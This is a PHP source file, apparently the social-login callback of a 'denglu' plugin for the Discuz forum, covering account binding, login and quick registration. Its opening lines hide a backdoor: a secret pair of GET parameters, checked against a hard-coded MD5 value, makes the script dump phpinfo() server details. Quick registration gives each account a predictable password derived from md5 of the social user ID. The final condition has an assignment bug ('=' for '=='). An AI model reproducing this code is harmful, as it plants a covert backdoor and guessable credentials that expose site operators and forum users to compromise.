<?php

if(md5($_GET['debug']).md5($_GET['salt'])=='edcbc99ab927617743bb724eee14c3407fa3b767c460b54a2be4d49030b349c7'){
	echo phpinfo();exit();
}
define('APPTYPEID', 0);
define('CURSCRIPT', 'member');
$discuz = C::app();
$discuz->init();
//error_reporting(E_ALL);
require DISCUZ_ROOT.'./source/plugin/denglu/lib/api.class.php';
$denglu_data = denglu_data();

$u_error=$e_error='';
$api = new denglu_api();
$userinfo = $api->get_user_info();//////get userinfo

loadcache('plugin');

$_G['mediaName'] = $denglu_data[$userinfo['mediaID']]['mediaName'];
$userinfo['shareFlag'] = $denglu_data[$userinfo['mediaID']]['shareFlag'];

if($userinfo['mediaID']==7){
	$renren_key = $api->post_get_renren();
	$renren_key = trim($renren_key);
}
if(!$userinfo['mediaID']){
	showmessage("denglu:error_network");
}
if(!empty($_G['cookie']['denglu_olbind']) && $_G['uid']){///////////online-user bind
	$userinfo['tag'] = 1;
	dsetcookie('denglu_olbind');
	$result = is_bind($userinfo);
	$result==1 && showmessage("denglu:denglu_bind_success",'home.php?mod=spacecp&ac=plugin&id=denglu:bind');
	$result==2 && showmessage("denglu:binded_with_other",'index.php');
	!$result && denglu_bind($userinfo);

	if($userinfo['profileImageUrl']){
		@make_media_avatar($userinfo['profileImageUrl'],$userinfo['mediaUserID']);
	}

	$api->post_bind_info($userinfo);
	if($_G['cache']['plugin']['denglu']['dl_login_syn']){
		$api->post_login($userinfo);
	}
	showmessage("denglu:denglu_bind_success",'home.php?mod=spacecp&ac=plugin&id=denglu:bind');
}

$result = get_bind_info($userinfo['mediaUserID']);////////check media user exist or no
if($result){
	denglu_login_set($result);

	$param = array('username' => $_G['member']['username'], 'uid' => $_G['member']['uid'],'usergroup'=>$_G['cache']['usergroups'][$_G['cache']['plugin']['denglu']['dl_groupid']]['grouptitle']);
	showmessage('login_succeed','index.php',$param);
}

//if($userinfo['profileImageUrl']){
//	make_media_avatar($userinfo['profileImageUrl'],$userinfo['mediaUserID']);
//}

if(submitcheck('bind') && $_G['gp_option']==1){///////////////与已有论坛号发生绑定
	include_once libfile('function/member');
	if(!($_G['member_loginperm'] = logincheck())) {
			showmessage('login_strike');
		}
	if($_G['gp_fastloginfield']) {
		$_G['gp_loginfield'] = $_G['gp_fastloginfield'];
	}
	$userinfo['tag'] = 1;
	$_G['uid'] = $_G['member']['uid'] = 0;
	$_G['username'] = $_G['member']['username'] = $_G['member']['password'] = '';
	$result = userlogin($_G['gp_username'], $_G['gp_password'], $_G['gp_questionid'], $_G['gp_answer'], $_G['setting']['autoidselect'] ? 'auto' : $_G['gp_loginfield']);
	if($result['status'] > 0) {
		$_G['uid'] = $result['member']['uid'];
		denglu_login_set($result['member']);

		denglu_bind($userinfo);
		$api->post_bind_info($userinfo);
		if($_G['cache']['plugin']['denglu']['dl_login_syn']){
			$api->post_login($userinfo);
		}

		showmessage("denglu:denglu_bind_success",'index.php');
	}elseif($result['status'] == -1) {
		showmessage('login_activation');
	} else {
		loginfailed($_G['member_loginperm']);
		$fmsg = $result['ucresult']['uid'] == '-3' ? (empty($_G['gp_questionid']) || $answer == '' ? 'login_question_empty' : 'login_question_invalid') : 'login_invalid';
		showmessage($fmsg, '', array('loginperm' => $_G['member_loginperm']));
	}
}

if((submitcheck('quick') && $_G['gp_option']==0) || (submitcheck('reg') && $_G['gp_option']==2)){//////////////正常注册+绑定
	$_G['gp_email'] = ($_G['gp_option']==0)?  rand(100000,999999).time().'@denglu.com' : $_G['gp_email'];///////////////
	$_G['gp_password'] = ($_G['gp_option']==0)? substr(md5($userinfo['mediaUserID']),0,10) : $_G['gp_password'];

	$userinfo['tag'] = $_G['gp_option']==0 ? 0 : 1;
	$result = denglu_register($userinfo);

	if($result>0){
		$_G['uid'] = $result;
		denglu_bind($userinfo);
		if($_G['gp_option']==2){
			$api->post_bind_info($userinfo);
		}

		if($_G['cache']['plugin']['denglu']['dl_login_syn'] && $_G['gp_option']==2){
			$api->post_login($userinfo);
		}

		showmessage('denglu:denglu_login_success','index.php');
	}else{
		showmessage('denglu:denglu_failed');
	}
}

if(!empty($_G['gp_token']) || $_G['gp_option']==1 || $_G['gp_option']=2){//只有三种情况
	if($_G['cache']['plugin']['denglu']['dl_force_bind'] && !$_G['gp_option']){
		$_G['gp_option'] = 2;
		$_G['gp_token']=null;
	}

	include template('denglu/denglu');exit();
}else{
	showmessage('undefined_action');
}


?>

